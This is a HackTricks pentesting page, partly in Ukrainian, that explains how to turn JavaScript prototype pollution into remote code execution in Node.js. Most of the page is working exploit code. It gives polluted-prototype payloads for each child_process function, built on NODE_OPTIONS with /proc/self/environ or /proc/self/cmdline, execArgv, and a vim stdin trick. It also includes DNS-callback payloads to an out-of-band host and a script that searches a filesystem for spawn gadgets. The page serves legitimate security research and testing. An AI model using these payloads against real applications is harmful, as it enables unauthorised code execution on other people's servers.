# Prototype Pollution to RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –£—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥

Imagine a real JS using some code like the following one:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE —á–µ—Ä–µ–∑ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

**PP2RCE** –æ–∑–Ω–∞—á–∞—î **–ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –¥–æ RCE** (–í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É).

–ó–≥—ñ–¥–Ω–æ –∑ —Ü–∏–º [**–æ–ø–∏—Å–æ–º**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), –∫–æ–ª–∏ **–ø—Ä–æ—Ü–µ—Å —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥–µ—è–∫–æ–≥–æ –º–µ—Ç–æ–¥—É –∑ **`child_process`** (—è–∫ `fork` –∞–±–æ `spawn` –∞–±–æ —ñ–Ω—à—ñ), –≤—ñ–Ω –≤–∏–∫–ª–∏–∫–∞—î –º–µ—Ç–æ–¥ `normalizeSpawnArguments`, —è–∫–∏–π —î **–≥–∞–¥–∂–µ—Ç–æ–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ–π –∫–æ–¥, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ —Ü–µ –º–æ–∂–ª–∏–≤–æ **–æ—Ç—Ä—É—ó—Ç–∏ `envPairs`** –ø—Ä–æ—Å—Ç–æ **–∑–∞–±—Ä—É–¥–Ω–∏–≤—à–∏** **–∞—Ç—Ä–∏–±—É—Ç `.env`.**

### **–û—Ç—Ä—É—î–Ω–Ω—è `__proto__`**

{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —á–µ—Ä–µ–∑ —Ç–µ, —è–∫ –ø—Ä–∞—Ü—é—î —Ñ—É–Ω–∫—Ü—ñ—è **`normalizeSpawnArguments`** –∑ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **`child_process`** –≤ node, –∫–æ–ª–∏ —â–æ—Å—å –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –¥–ª—è **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É, –≤–∞–º –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–∞–±—Ä—É–¥–Ω–∏—Ç–∏ —â–æ-–Ω–µ–±—É–¥—å**.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –∑—Ä–æ–±–∏—Ç–µ `__proto__.avar="valuevar"`, –ø—Ä–æ—Ü–µ—Å –±—É–¥–µ –∑–∞–ø—É—â–µ–Ω–æ –∑—ñ –∑–º—ñ–Ω–Ω–æ—é, –Ω–∞–∑–≤–∞–Ω–æ—é `avar`, –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º `valuevar`.

–û–¥–Ω–∞–∫, —â–æ–± **–∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –±—É–ª–∞ –ø–µ—Ä—à–æ—é**, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–∞–±—Ä—É–¥–Ω–∏—Ç–∏** **–∞—Ç—Ä–∏–±—É—Ç `.env`**, —ñ (—Ç—ñ–ª—å–∫–∏ –≤ –¥–µ—è–∫–∏—Ö –º–µ—Ç–æ–¥–∞—Ö) —Ü—è –∑–º—ñ–Ω–Ω–∞ –±—É–¥–µ **–ø–µ—Ä—à–æ—é** (–¥–æ–∑–≤–æ–ª—è—é—á–∏ –∞—Ç–∞–∫—É).

–û—Å—å —á–æ–º—É **`NODE_OPTIONS`** **–Ω–µ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `.env`** –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∞—Ç–∞—Ü—ñ.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### –û—Ç—Ä—É—î–Ω–Ω—è `constructor.prototype`
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE —á–µ—Ä–µ–∑ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ + –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫

–°—Ö–æ–∂–∏–π –∫–æ—Ä–∏—Å–Ω–∏–π –≤–∞–Ω—Ç–∞–∂ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑ –¥–µ—è–∫–∏–º–∏ –∑–º—ñ–Ω–∞–º–∏ –±—É–≤ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π —É [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** –û—Å–Ω–æ–≤–Ω—ñ –≤—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—ñ:

* –ó–∞–º—ñ—Å—Ç—å –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è nodejs **payload** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É `/proc/self/environ`, –≤—ñ–Ω –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è **–≤ argv0** —Ñ–∞–π–ª—É **`/proc/self/cmdline`**.
* –ü–æ—Ç—ñ–º, –∑–∞–º—ñ—Å—Ç—å –≤–∏–º–æ–≥–∏ —á–µ—Ä–µ–∑ **`NODE_OPTIONS`** —Ñ–∞–π–ª—É `/proc/self/environ`, –≤—ñ–Ω **–≤–∏–º–∞–≥–∞—î `/proc/self/cmdline`**.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNS Interaction

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –ø–µ–π–ª–æ–∞–¥–∏, –º–æ–∂–ª–∏–≤–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω–æ—é —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ NODE\_OPTIONS, –ø—Ä–æ —è–∫—É –º–∏ –≥–æ–≤–æ—Ä–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ, —ñ –≤–∏—è–≤–∏—Ç–∏, —á–∏ —Å–ø—Ä–∞—Ü—é–≤–∞–ª–æ —Ü–µ, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ DNS:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
–ê–±–æ, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –∑–∞–ø–∏—Ç—ñ–≤ WAF –¥–æ –¥–æ–º–µ–Ω—É:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ñ—É–Ω–∫—Ü—ñ–π child\_process

–£ —Ü—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ –º–∏ –±—É–¥–µ–º–æ –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ **–∫–æ–∂–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –∑ `child_process`** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏–º–æ, —á–∏ –º–æ–∂–µ–º–æ –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –±—É–¥—å-—è–∫—É —Ç–µ—Ö–Ω—ñ–∫—É, —â–æ–± –ø—Ä–∏–º—É—Å–∏—Ç–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥:

<details>

<summary><code>exec</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
–î–ª—è **`execFile`** —â–æ–± –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, –≤—ñ–Ω **–ü–û–í–ò–ù–ï–ù –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ node** –¥–ª—è —Ä–æ–±–æ—Ç–∏ NODE\_OPTIONS.\
–Ø–∫—â–æ –≤—ñ–Ω **–Ω–µ** –≤–∏–∫–æ–Ω—É—î **node**, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏, —è–∫ –≤–∏ –º–æ–≥–ª–∏ –± **–∑–º—ñ–Ω–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è** —Ç–æ–≥–æ, —â–æ –≤—ñ–Ω –≤–∏–∫–æ–Ω—É—î **–∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —ó—Ö.

**–Ü–Ω—à—ñ** —Ç–µ—Ö–Ω—ñ–∫–∏ **–ø—Ä–∞—Ü—é—é—Ç—å** –±–µ–∑ —Ü—ñ—î—ó –≤–∏–º–æ–≥–∏, –æ—Å–∫—ñ–ª—å–∫–∏ **–º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏** **—Ç–µ, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** —á–µ—Ä–µ–∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É. (–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–±—Ä—É–¥–Ω–∏—Ç–∏ `.shell`, –≤–∏ –Ω–µ –∑–∞–±—Ä—É–¥–Ω–∏—Ç–µ —Ç–µ, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è).

</details>

<details>

<summary><code>fork</code> exploitation</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## –ü—Ä–∏–º—É—Å–æ–≤–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è

–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –≤–∏ –±–∞—á–∏–ª–∏, —è–∫ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç, —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ **–≤–∏–∫–ª–∏–∫–∞—î `spawn`**, –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ **–ø—Ä–∏—Å—É—Ç–Ω—è** (–≤—Å—ñ –º–µ—Ç–æ–¥–∏ **`child_process`**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–æ–≥–æ—Å—å, –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –π–æ–≥–æ). –£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ —Ü–µ –±—É–ª–æ **—á–∞—Å—Ç–∏–Ω–æ—é –∫–æ–¥—É**, –∞–ª–µ —â–æ, —è–∫—â–æ –∫–æ–¥ **–Ω–µ –≤–∏–∫–ª–∏–∫–∞—î** –π–æ–≥–æ.

### –ö–æ–Ω—Ç—Ä–æ–ª—å —à–ª—è—Ö—É –¥–æ —Ñ–∞–π–ª—É require

–£ —Ü—å–æ–º—É [**—ñ–Ω—à–æ–º—É –æ–ø–∏—Å—ñ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É, –¥–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ **`require`**. –£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∞—Ç–∞–∫—É—é—á–æ–º—É –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–Ω–∞–π—Ç–∏ `.js` —Ñ–∞–π–ª —É —Å–∏—Å—Ç–µ–º—ñ**, —è–∫–∏–π **–≤–∏–∫–æ–Ω–∞—î –º–µ—Ç–æ–¥ spawn –ø—Ä–∏ —ñ–º–ø–æ—Ä—Ç—ñ.**\
–î–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –∑–∞–≥–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é spawn –ø—Ä–∏ —ñ–º–ø–æ—Ä—Ç—ñ:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* –ó–Ω–∞–π–¥—ñ—Ç—å **–±—ñ–ª—å—à–µ —Ñ–∞–π–ª—ñ–≤ –Ω–∏–∂—á–µ**

–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–æ—Å—Ç–∏–π —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ —à—É–∫–∞—Ç–∏ **–≤–∏–∫–ª–∏–∫–∏** –∑ **child\_process** **–±–µ–∑ –±—É–¥—å-—è–∫–æ–≥–æ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è** (—â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ–∫–∞–∑—É –≤–∏–∫–ª–∏–∫—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ–π):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>–¶—ñ–∫–∞–≤—ñ —Ñ–∞–π–ª–∏, –∑–Ω–∞–π–¥–µ–Ω—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º —Å–∫—Ä–∏–ø—Ç–æ–º</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
